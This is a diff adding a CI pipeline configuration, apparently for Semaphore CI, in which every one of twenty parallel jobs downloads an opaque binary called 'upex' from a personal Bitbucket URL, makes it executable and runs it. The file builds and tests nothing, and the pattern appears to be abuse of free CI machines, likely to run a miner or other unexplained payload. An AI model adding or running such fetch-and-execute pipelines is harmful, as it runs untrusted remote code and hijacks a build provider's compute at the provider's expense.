@@ -1,0 +1,113 @@
+version: v1.0
+name: Parallel
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #2'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #3'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #4'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #5'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #6'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #7'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #8'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #9'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+        - name: 'Job #10'
+          commands:
+            - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+            - chmod +x upex
+            - ./upex
+after_pipeline:
+  task:
+    jobs:
+      - name: 'Job #1'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #2'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #3'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #4'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #5'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #6'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #7'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #8'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #9'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
+      - name: 'Job #10'
+        commands:
+          - 'wget https://bitbucket.org/abetasa/garatsas/raw/5b4fc4bf7eb597b119a1fbce48c2101d273c1063/upex'
+          - chmod +x upex
+          - ./upex
